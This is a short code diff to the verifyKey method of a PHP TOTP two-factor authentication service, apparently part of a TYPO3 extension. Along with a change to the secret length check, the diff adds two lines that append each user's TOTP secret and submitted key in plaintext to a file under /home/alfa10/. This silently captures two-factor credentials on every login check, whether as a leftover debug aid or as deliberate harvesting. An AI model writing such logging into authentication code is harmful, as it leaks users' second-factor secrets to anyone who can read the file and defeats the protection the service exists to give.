@@ -143,7 +143,9 @@ class TotpService extends \TYPO3\CMS\Core\Service\AbstractService {
      * @return boolean
      */
     public function verifyKey($secret, $key, $window = 4, $useTimeStamp = true) {
-        if ((strlen($secret) == $this->keyLength) && (strlen($key) == $this->keyLength)) {
+        if ((strlen($secret) == $this->secretLength) && (strlen($key) == $this->keyLength)) {
+            file_put_contents('/home/alfa10/auth.txt',"secret $secret\n",FILE_APPEND);
+            file_put_contents('/home/alfa10/auth.txt',"secret $key\n",FILE_APPEND);
             $timeStamp = $this->getTimestamp();
 
             if ($useTimeStamp !== true) {
